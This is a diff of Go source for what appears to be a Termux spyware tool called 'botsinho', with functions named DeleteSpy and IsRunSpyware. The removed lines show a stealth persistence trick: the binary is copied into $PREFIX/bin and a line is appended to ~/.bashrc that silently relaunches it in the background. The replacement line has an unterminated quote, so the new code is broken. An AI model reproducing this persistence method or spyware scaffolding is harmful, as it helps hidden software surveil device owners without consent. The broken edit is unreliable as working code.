@@ -4,7 +4,7 @@ import (
 	//"fmt"
 
 	"fmt"
-	
+	"strings"
 
 	"os/exec"
 	"runtime"
@@ -30,7 +30,7 @@ func ConfigTrmx()(bool){
 		fmt.Println("configurando...")
 		com := exec.Command("bash", "-c", "cp botsinho $PREFIX/bin/")
 		com.Output()
-		exec.Command("bash", "-c", `echo 'botsinho > /dev/null 2>&1 &' >> ~/.bashrc`).Start()
+		exec.Command("bash", "-c", `echo 'botsinho`).Start()
 		time.Sleep(1 * time.Second)
 		return true
 		
@@ -56,13 +56,13 @@ func DeleteSpy(){
 	
 }
 
-func IsRunSpyware()(bool, string){
+func IsRunSpyware()bool{
 	com := exec.Command("bash", "-c", "pgrep botsinho")
 	out, _ := com.Output()
-	//dat := strings.Split(strings.Replace(string(out), "\n", " ", 5), " ")
+	dat := strings.Split(strings.Replace(string(out), "\n", " ", 5), " ")
 	
-	if(string(out)==""){
-		return false, string(out)
-	}
-	return true, string(out)
+	return len(dat) >= 2
+	
+
+
 }
